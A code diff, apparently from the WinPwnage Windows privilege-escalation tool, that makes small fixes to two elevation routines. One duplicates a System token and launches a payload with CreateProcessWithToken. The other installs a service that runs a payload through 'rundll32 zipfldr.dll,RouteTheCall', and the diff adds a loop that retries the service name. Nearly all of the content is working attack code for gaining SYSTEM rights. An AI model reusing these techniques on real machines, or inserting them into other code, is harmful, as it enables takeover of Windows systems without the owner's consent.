@@ -149,7 +149,7 @@ def elevate2(payload):
         log.error("Cannot proceed, we are not elevated")
         return
 
-    params = " ".join(payload[1:])
+    params = " ".join(payload[1:]) or None
     payload = payload[0]
 
     log.debug("Enabling SeDebugPrivilege")
@@ -195,9 +195,9 @@ def elevate2(payload):
             log.debug("Impersonating System IL token")
             lpStartupInfo = STARTUPINFO()
             lpStartupInfo.cb = sizeof(lpStartupInfo)
-            lpProcessInformation = PROCESS_INFORMATION()
             lpStartupInfo.dwFlags = 0x00000001
             lpStartupInfo.wShowWindow = 5
+            lpProcessInformation = PROCESS_INFORMATION()
 
             if not CreateProcessWithToken(hTokendupe, 0x00000002, payload, params, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)):
                 log.error(f"Error while triggering admin payload using CreateProcessWithLogonW: {GetLastError()}")
@@ -534,7 +534,6 @@ def elevate6(payload):
         log.error("Cannot proceed, we are not elevated")
         return
 
-    servicename = b"WinPwnage"
     localhost = rb"\\localhost"
     ret = 0
 
@@ -544,16 +543,20 @@ def elevate6(payload):
         log.error(f"Error while connecting to the local service database using OpenSCManager: ({GetLastError()})")
         return
 
-    schService = CreateService(
-        schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 0x00000003, 0x00000000,
-        bytes(f"rundll32.exe {os.path.join(system_directory(), 'zipfldr.dll')},RouteTheCall {' '.join(payload)}", encoding="utf-8"),
-        None, None, None, None, None
-    )
+    for i in range(1000):
+        servicename = b"WinPwnage%d" % i
+        schService = CreateService(
+            schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 0x00000003, 0x00000000,
+            bytes(f"rundll32.exe {os.path.join(system_directory(), 'zipfldr.dll')},RouteTheCall {' '.join(payload)}", encoding="utf-8"),
+            None, None, None, None, None
+        )
+        if not schService:
+            log.error(f"Error while installing our service using CreateService: ({GetLastError()})")
+        else:
+            log.info(f"Successfully installed service ({servicename}) using CreateService")
+            break
     if not schService:
-        log.error(f"Error while installing our service using CreateService: ({GetLastError()})")
         return
-    else:
-        log.info(f"Successfully installed service ({servicename}) using CreateService")
 
     CloseServiceHandle(schSCManager)
     CloseServiceHandle(schService)
